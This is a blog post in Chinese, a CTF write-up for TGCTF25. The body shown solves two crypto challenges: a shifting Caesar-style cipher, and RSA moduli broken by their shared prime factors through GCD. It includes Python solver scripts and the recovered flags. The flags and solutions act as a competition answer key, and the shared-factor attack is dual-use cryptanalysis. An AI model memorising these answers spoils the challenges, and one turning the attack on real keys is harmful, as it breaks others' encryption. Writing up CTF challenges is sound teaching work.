<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="不知道"><meta name="copyright" content="不知道"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>TGCTF25 不知道 WP | 不知道のblog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png"><link rel="mask-icon" href="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png" color="#6200ee"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":"不知道的小站","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="战队名：不知道排名：3  CryptoAAAAAAAA·真·签到UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} 和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++ enc&#x3D;&#39;UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;&#39;  s&#x3D;&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; for i in range(len">
<meta property="og:type" content="article">
<meta property="og:title" content="TGCTF25 不知道 WP">
<meta property="og:url" content="http://example.com/2025/04/14/TGCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/index.html">
<meta property="og:site_name" content="不知道のblog">
<meta property="og:description" content="战队名：不知道排名：3  CryptoAAAAAAAA·真·签到UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} 和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++ enc&#x3D;&#39;UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;&#39;  s&#x3D;&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; for i in range(len">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png">
<meta property="og:image" content="http://example.com/images/1744633170180-60.png">
<meta property="og:image" content="http://example.com/images/1744633170177-2.png">
<meta property="og:image" content="http://example.com/images/1744633170177-3.png">
<meta property="og:image" content="http://example.com/images/1744633170177-4.png">
<meta property="og:image" content="http://example.com/images/1744633170177-5.png">
<meta property="og:image" content="http://example.com/images/1744633170177-6.png">
<meta property="og:image" content="http://example.com/images/1744633170177-7.png">
<meta property="og:image" content="http://example.com/images/1744633170177-8.png">
<meta property="og:image" content="http://example.com/images/1744633170177-9.png">
<meta property="og:image" content="http://example.com/images/1744633170177-10.png">
<meta property="og:image" content="http://example.com/images/1744633170177-11.png">
<meta property="og:image" content="http://example.com/images/1744633170177-12.png">
<meta property="og:image" content="http://example.com/images/1744633170177-13.png">
<meta property="og:image" content="http://example.com/images/1744633170177-14.png">
<meta property="og:image" content="http://example.com/images/1744633170177-15.png">
<meta property="og:image" content="http://example.com/images/1744633170178-16.png">
<meta property="og:image" content="http://example.com/images/1744633170178-17.png">
<meta property="og:image" content="http://example.com/images/1744633170178-18.png">
<meta property="og:image" content="http://example.com/images/1744633170178-19.png">
<meta property="og:image" content="http://example.com/images/1744633170178-20.png">
<meta property="og:image" content="http://example.com/images/1744633170178-21.png">
<meta property="og:image" content="http://example.com/images/1744633170178-22.png">
<meta property="og:image" content="http://example.com/images/1744633170178-23.png">
<meta property="og:image" content="http://example.com/images/1744633170178-24.png">
<meta property="og:image" content="http://example.com/images/1744633170178-25.png">
<meta property="og:image" content="http://example.com/images/1744633170178-26.png">
<meta property="og:image" content="http://example.com/images/1744633170178-27.png">
<meta property="og:image" content="http://example.com/images/1744633170178-28.png">
<meta property="og:image" content="http://example.com/images/1744633170178-29.png">
<meta property="og:image" content="http://example.com/images/1744633170178-30.png">
<meta property="og:image" content="http://example.com/images/1744633170178-31.png">
<meta property="og:image" content="http://example.com/images/1744633170178-32.png">
<meta property="og:image" content="http://example.com/images/1744633170178-33.png">
<meta property="og:image" content="http://example.com/images/1744633170178-34.png">
<meta property="og:image" content="http://example.com/images/1744633170178-35.png">
<meta property="og:image" content="http://example.com/images/1744633170178-36.png">
<meta property="og:image" content="http://example.com/images/1744633170179-37.png">
<meta property="og:image" content="http://example.com/images/1744633170179-38.png">
<meta property="og:image" content="http://example.com/images/1744633170179-39.png">
<meta property="og:image" content="http://example.com/images/1744633170179-40.png">
<meta property="og:image" content="http://example.com/images/1744633170179-41.png">
<meta property="og:image" content="http://example.com/images/1744633170179-42.png">
<meta property="og:image" content="http://example.com/images/1744633170179-43.png">
<meta property="og:image" content="http://example.com/images/1744633170179-44.png">
<meta property="og:image" content="http://example.com/images/1744633170179-45.png">
<meta property="og:image" content="http://example.com/images/1744633170179-46.png">
<meta property="og:image" content="http://example.com/images/1744633170179-47.png">
<meta property="og:image" content="http://example.com/images/1744633170179-48.png">
<meta property="og:image" content="http://example.com/images/1744633170179-49.png">
<meta property="og:image" content="http://example.com/images/1744633170179-50.png">
<meta property="og:image" content="http://example.com/images/1744633170179-51.png">
<meta property="og:image" content="http://example.com/images/1744633170179-52.png">
<meta property="og:image" content="http://example.com/images/1744633170179-53.png">
<meta property="og:image" content="http://example.com/images/1744633170179-54.png">
<meta property="og:image" content="http://example.com/images/1744633170179-55.png">
<meta property="og:image" content="http://example.com/images/1744633170179-56.png">
<meta property="og:image" content="http://example.com/images/1744633170179-57.png">
<meta property="og:image" content="http://example.com/images/1744633170179-58.png">
<meta property="og:image" content="http://example.com/images/1744633170179-59.png">
<meta property="article:published_time" content="2025-04-14T12:07:39.000Z">
<meta property="article:modified_time" content="2025-04-14T12:23:21.150Z">
<meta property="article:author" content="不知道">
<meta property="article:tag" content="cry">
<meta property="article:tag" content="web">
<meta property="article:tag" content="re">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="不知道"><img width="96" loading="lazy" src="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png" alt="不知道"></a><div class="site-author-name"><a href="/about/">不知道</a></div><a class="site-name" href="/about/site.html">不知道のblog</a><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E5%90%8D%EF%BC%9A%E4%B8%8D%E7%9F%A5%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">战队名：不知道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AAAAAAAA%C2%B7%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">AAAAAAAA·真·签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mm%E4%B8%8D%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text">mm不躲猫猫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RwSiAns"><span class="toc-number">1.1.3.</span> <span class="toc-text">RwSiAns</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E5%AE%9Drsa"><span class="toc-number">1.1.4.</span> <span class="toc-text">宝宝rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%B9%E5%85%8B%E7%89%B9%E5%B0%94"><span class="toc-number">1.1.5.</span> <span class="toc-text">费克特尔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZRSA"><span class="toc-number">1.1.6.</span> <span class="toc-text">EZRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLLCG"><span class="toc-number">1.1.7.</span> <span class="toc-text">LLLCG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack"><span class="toc-number">1.2.3.</span> <span class="toc-text">stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">1.2.4.</span> <span class="toc-text">overflow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64"><span class="toc-number">1.3.1.</span> <span class="toc-text">Base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E6%9E%9C%E5%BF%8D%E8%80%85"><span class="toc-number">1.3.2.</span> <span class="toc-text">水果忍者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9B%87%E5%B9%B4%E7%9A%84%E6%9C%AC%E5%91%BD%E8%AF%AD%E8%A8%80"><span class="toc-number">1.3.3.</span> <span class="toc-text">蛇年的本命语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XTEA"><span class="toc-number">1.3.4.</span> <span class="toc-text">XTEA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#randomsystem"><span class="toc-number">1.3.5.</span> <span class="toc-text">randomsystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#conforand%EF%BC%88%E9%9D%9E%E9%A2%84%E6%9C%9F%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">conforand（非预期）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exchange"><span class="toc-number">1.3.7.</span> <span class="toc-text">exchange</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Index"><span class="toc-number">1.3.8.</span> <span class="toc-text">Index</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.4.1.</span> <span class="toc-text">(ez)upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="toc-number">1.4.2.</span> <span class="toc-text">AAA偷渡阴平</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F"><span class="toc-number">1.4.3.</span> <span class="toc-text">什么文件上传？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME"><span class="toc-number">1.4.4.</span> <span class="toc-text">前端GAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-plus"><span class="toc-number">1.4.5.</span> <span class="toc-text">前端GAME plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E8%BE%A9%E9%AD%91%E9%AD%85"><span class="toc-number">1.4.6.</span> <span class="toc-text">火眼辩魑魅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="toc-number">1.4.7.</span> <span class="toc-text">熟悉的配方，熟悉的味道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="toc-number">1.4.8.</span> <span class="toc-text">直面天命</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TG-wordpress"><span class="toc-number">1.4.9.</span> <span class="toc-text">TG_wordpress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-number">1.4.10.</span> <span class="toc-text">AAA偷渡阴平（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-number">1.4.11.</span> <span class="toc-text">什么文件上传？（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGCTF-2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-number">1.4.12.</span> <span class="toc-text">TGCTF 2025 后台管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E7%99%BB%EF%BC%8C%E7%82%B8%E9%B1%BC%E6%9D%A5%E4%BA%86%EF%BC%9F"><span class="toc-number">1.4.13.</span> <span class="toc-text">老登，炸鱼来了？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-number">1.4.14.</span> <span class="toc-text">直面天命（复仇）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#next-is-the-end"><span class="toc-number">1.5.1.</span> <span class="toc-text">next is the end</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#where-it-is"><span class="toc-number">1.5.2.</span> <span class="toc-text">where_it_is</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E8%BF%90%E6%B0%94%E6%98%AF%E5%A5%BD%E6%98%AF%E5%9D%8F%EF%BC%9F"><span class="toc-number">1.5.3.</span> <span class="toc-text">你的运气是好是坏？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TeamGipsy-ctfer"><span class="toc-number">1.5.4.</span> <span class="toc-text">TeamGipsy&amp;ctfer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-zip"><span class="toc-number">1.5.5.</span> <span class="toc-text">ez_zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5o-o"><span class="toc-number">1.5.6.</span> <span class="toc-text">这是啥o_o</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E5%8F%91%E7%8E%B0%E5%9B%BE%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E5%90%97"><span class="toc-number">1.5.7.</span> <span class="toc-text">你能发现图中的秘密吗?</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#6200ee;"><link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/TGCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="不知道"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="不知道のblog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">TGCTF25 不知道 WP</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-04-14 20:07:39" itemprop="dateCreated datePublished" datetime="2025-04-14T20:07:39+08:00">2025-04-14</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/wp/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">wp</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/cry/" style="--text-color:#4fc08d"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">cry</span></a><a class="tag-item" href="/tags/web/" style="--text-color:#5298d1"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/re/" style="--text-color:#0E834D"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">re</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:#026E00"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a><a class="tag-item" href="/tags/misc/" style="--text-color:#F14E32"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">misc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名：3</strong></p>
<p><img src="/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png" loading="lazy"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="AAAAAAAA·真·签到"><a href="#AAAAAAAA·真·签到" class="headerlink" title="AAAAAAAA·真·签到"></a>AAAAAAAA·真·签到</h3><p>UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}</p>
<p>和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++</p>
<pre class="language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;'</span>

s<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>

        ind<span class="token operator">=</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        ind<span class="token operator">+=</span>i<span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>ind<span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>
</blockquote>
<h3 id="mm不躲猫猫"><a href="#mm不躲猫猫" class="headerlink" title="mm不躲猫猫"></a>mm不躲猫猫</h3><p>给了60组n，c，n有公共因子gcd求得解密即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> <span class="token number">65537</span>

n_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
c_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

current_n <span class="token operator">=</span> <span class="token boolean">None</span>
current_c <span class="token operator">=</span> <span class="token boolean">None</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'E:\\wenjian\\p\\timu\\tgCTF\\cry\\challenge.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>
        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span> <span class="token keyword">and</span> line<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> current_n <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> current_c <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                n_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_n<span class="token punctuation">)</span>
                c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_c<span class="token punctuation">)</span>
                current_n <span class="token operator">=</span> <span class="token boolean">None</span>
                current_c <span class="token operator">=</span> <span class="token boolean">None</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'n = '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            current_n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'c = '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            current_c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> current_n <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> current_c <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        n_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_n<span class="token punctuation">)</span>
        c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_c<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    n<span class="token operator">=</span>n_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    other<span class="token operator">=</span>n_list<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> n_list<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    p<span class="token operator">=</span><span class="token boolean">None</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> other<span class="token punctuation">:</span>
        <span class="token keyword">if</span> GCD<span class="token punctuation">(</span>n<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
            p<span class="token operator">=</span>GCD<span class="token punctuation">(</span>n<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
            q<span class="token operator">=</span>n<span class="token operator">//</span>p
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> p <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}</p>
</blockquote>
